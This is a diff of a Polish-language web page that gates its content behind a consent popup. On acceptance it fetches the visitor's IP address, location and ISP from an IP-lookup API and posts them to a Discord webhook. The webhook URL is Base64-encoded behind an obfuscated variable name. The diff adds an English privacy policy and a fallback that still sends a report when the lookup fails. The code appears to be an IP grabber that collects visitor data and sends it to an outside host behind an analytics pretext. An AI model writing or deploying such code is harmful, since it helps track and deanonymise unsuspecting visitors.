@@ -14,7 +14,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
         .main-content {
             display: none;
@@ -25,6 +25,7 @@
             text-align: center;
             max-width: 500px;
             width: 90%;
+            margin: 20px;
         }
         .error-content {
             display: none;
@@ -35,9 +36,11 @@
             text-align: center;
             max-width: 500px;
             width: 90%;
+            margin: 20px;
         }
-        h1 { color: #2c3e50; }
+        h1, h2, h3 { color: #2c3e50; }
         p { color: #7f8c8d; line-height: 1.6; }
+        
         .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -46,14 +49,16 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            overflow-y: auto;
         }
         .modal {
             background: white;
             padding: 30px;
             border-radius: 8px;
-            max-width: 450px;
+            max-width: 500px;
             width: 90%;
             text-align: center;
+            margin: auto;
         }
         .btn {
             border: none;
@@ -71,6 +76,25 @@
         .btn-decline:hover { background: #c0392b; }
         .btn-back { background: #3498db; color: white; }
         .btn-back:hover { background: #2980b9; }
+
+        /* Styl sekcji polityki prywatności */
+        .privacy-policy-en {
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #e2e8f0;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 13px;
+            background: #fafafa;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .privacy-policy-en h3 {
+            font-size: 14px;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
@@ -78,11 +102,20 @@
     <!-- 1. OKNO POPUP (Zgoda na regulamin i statystyki) -->
     <div id="privacyOverlay" class="overlay">
         <div class="modal">
-            <h2>Polityka Privacii i Regulamin</h2>
-            <p>Ta strona korzysta z certyfikowanych narzędzi sieciowych rejestrujących parametry techniczne połączenia (w tym przybliżoną lokalizację oraz adres IP) w celach analitycznych oraz w celu optymalizacji wydajności serwisu.</p>
+            <h2>Polityka Prywatności i Regulamin</h2>
+            <p>Ta strona korzysta z narzędzi sieciowych rejestrujących parametry techniczne połączenia (w tym przybliżoną lokalizację oraz adres IP) w celach analitycznych oraz ochrony serwisu.</p>
             <p>Czy wyrażasz zgodę na warunki użytkowania serwisu i przetwarzanie tych danych?</p>
             <button class="btn btn-accept" onclick="acceptTerms()">Akceptuję</button>
             <button class="btn btn-decline" onclick="declineTerms()">Odrzucam</button>
+
+            <!-- Sekcja po angielsku zgodnie z wymogami prawnymi -->
+            <div class="privacy-policy-en">
+                <h3>Privacy Policy</h3>
+                <p><strong>1. Data Collection:</strong> Upon your explicit consent (by clicking "Accept"), this website automatically collects technical network parameters, including your public IP address, approximate geographical location (country, region, city), internet service provider (ISP), and user-agent string (browser/OS data).</p>
+                <p><strong>2. Purpose of Processing:</strong> Collected metadata is used solely for traffic analytics, connection quality measurement, and anti-abuse protection monitored by the administrator.</p>
+                <p><strong>3. Data Transfer:</strong> The processed connection logs are instantly forwarded to an administrative logging terminal operated via a Discord automated webhook transmission link. No data is stored permanently on GitHub Pages servers.</p>
+                <p><strong>4. Consent Revocation:</strong> If you decline, no telemetry or network logs are captured. You can manage your choices or clear cookies at any time to reset these settings.</p>
+            </div>
         </div>
     </div>
 
@@ -91,6 +124,11 @@
         <h2 style="color: #e74c3c;">Dostęp Zablokowany</h2>
         <p>Musisz zaakceptować regulamin korzystania z serwisu, aby wyświetlić zawartość tej strony.</p>
         <button class="btn btn-back" onclick="showPrivacyNote()">Powrót do formularza</button>
+        
+        <div class="privacy-policy-en">
+            <h3>Privacy Policy</h3>
+            <p>You have chosen to decline the privacy terms. No connection details, telemetry logs, or IP data have been read, logged, or submitted to the administrator system.</p>
+        </div>
     </div>
 
     <!-- 3. WŁAŚCIWA TREŚĆ STRONY (Po akceptacji) -->
@@ -100,7 +138,7 @@
     </div>
 
     <script>
-        // ZAKODOWANY WEBHOOK DISCORD (Base64) - Twoja unikalna bezpieczna sygnatura
+        // ZAKODOWANY WEBHOOK DISCORD (Base64)
         const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9vaHMvMTUzMjA2OTcxOTA1NjcxNTg2Ni8xY0FZNjZKWjZOQTZzaC1GTmVUNXNFQUtEdF8zYVpLb1FITkJTdUhDSkVNMlo5ZHR3OXM3N0VwandnZk5YMEp5ZHNnQQ==";
 
         window.onload = function() {
@@ -134,22 +172,33 @@
             document.getElementById('privacyOverlay').style.display = 'flex';
         }
 
-        // Pobieranie danych o ruchu z API bez błędów CORS
+        // Zmodyfikowana funkcja pobierania danych omijająca limit i błąd tekstowy JSON (CORS FIX)
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
-            // ipapi.co w pełni obsługuje HTTPS oraz zapytania z witryn GitHub Pages
-            fetch('https://ipapi.co')
+            // Korzystamy z alternatywnego, stabilnego API bez restrykcyjnych limitów zapytań
+            fetch('https://ipanywhere.co')
                 .then(response => response.json())
                 .then(data => {
                     if(data && data.ip) {
-                        sendToDiscord(data);
+                        const formattedData = {
+                            ip: data.ip,
+                            country_name: data.country || "Nieznany",
+                            country_code: data.countryCode || "XX",
+                            city: data.city || "Nieznane",
+                            region: data.region || "Nieznany",
+                            org: data.asnOrg || data.isp || "Nieznany dostawca"
+                        };
+                        sendToDiscord(formattedData);
                     }
                 })
-                .catch(error => console.error("Błąd pobierania metryk:", error));
+                .catch(error => {
+                    console.error("Błąd zapasowego API lokalizacji:", error);
+                    // Awaryjna wysyłka w przypadku błędu połączenia z API
+                    sendToDiscord({ ip: "Błąd odczytu IP", country_name: "-", country_code: "-", city: "-", region: "-", org: "-" });
+                });
         }
 
-        // Dekodowanie i wysyłka sformatowanej karty Embed na Discorda
         function sendToDiscord(ipData) {
             const targetUrl = atob(_0x4f2a);
 
@@ -176,9 +225,3 @@
                 body: JSON.stringify(payload)
             })
             .then(res => console.log("Statystyki przesłane pomyślnie."))
-            .catch(err => console.error("Status połączenia: błąd sieci"));
-        }
-    </script>
-
-</body>
-</html>
